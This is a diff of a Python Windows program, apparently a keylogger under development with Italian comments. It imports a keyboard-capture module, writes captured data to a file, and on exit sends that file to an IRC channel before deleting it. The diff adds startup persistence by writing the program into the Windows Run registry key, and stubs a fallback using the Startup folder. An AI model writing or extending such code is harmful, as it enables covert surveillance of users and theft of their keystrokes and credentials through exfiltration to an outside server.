@@ -4,11 +4,14 @@ import win32process
 import concurrent.futures
 import keyboard
 from atexit import register
-from os import remove
+from os import remove, path
 from string import ascii_letters, digits
 from random import choice, randint
 import socket
 from time import sleep
+from ctypes import windll
+import winreg as reg
+from sys import argv
 
 # Configuration section
 OUT = "out.txt"     # Out filename
@@ -23,14 +26,40 @@ USERNAME = randomUSR()
 
 # Funzione che controlla i permessi
 # se amministratore si imposta all'avvio, altrimenti bisogna trovare una soluzione alternativa
-def checkAdmin():
-    pass
+def autoExecOnStartup():
+    def checkAdmin():
+        try:
+            windll.shell32.IsUserAnAdmin()
+            return True
+        except AttributeError:
+            return False
+        
+    if checkAdmin():
+        # Setup
+        prog_name = path.basename(argv[0])
+        prog_path = path.dirname(path.abspath(argv[0]))
+        print(prog_path) #Debug
+        key_path = r"Software\\Microsoft\Windows\\CurrentVersion\\Run"
+        # Change REG key
+        try:
+            key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
+            reg.SetValueEx(key, prog_name, 0, reg.REG_SZ, prog_path)
+            reg.CloseKey(key)
+            print(f"Il programma {prog_name} è stato aggiunto all'avvio automatico.")
+        except Exception as e:
+            print(f"Errore durante l'impostazione dell'avvio automatico: {e}")
+    
+    else:
+        # Cercare metodo alternativo
+        alternative_path = "C:\\Users\\current_user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+        # Creare collegamento in alternative_path
+        pass
 
 # Function on program's exit
 def sendAndErase():
     # IRC
     HOST = "irc.libera.chat"
-    PORT = 6697 # TLS
+    PORT = 6667 # TLS
     CHANNEL = 'fish'
     NICK = USERNAME
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -118,6 +147,9 @@ def filteringProcs(processes):
      
 # Debug function (IRC Debug)
 def auto():
+    autoExecOnStartup()
+    
+    
     remove(OUT)
     f = open(OUT, "+a", encoding='UTF-8')
     f.write("ciao!")
@@ -131,7 +163,7 @@ if __name__ == "__main__":
     auto()  # Eliminare per programma completo, funge solo da funzione di debug per velocizzare il processo di testing per upload
     
     # Start
-    checkAdmin()
+    autoExecOnStartup()
     manager = wmi.WMI() # Set win control
     # Continue read/filter processes until I find an occurence (see procList[] in filteringProcs())
     while filteringProcs(getProcs(manager)) == 1:
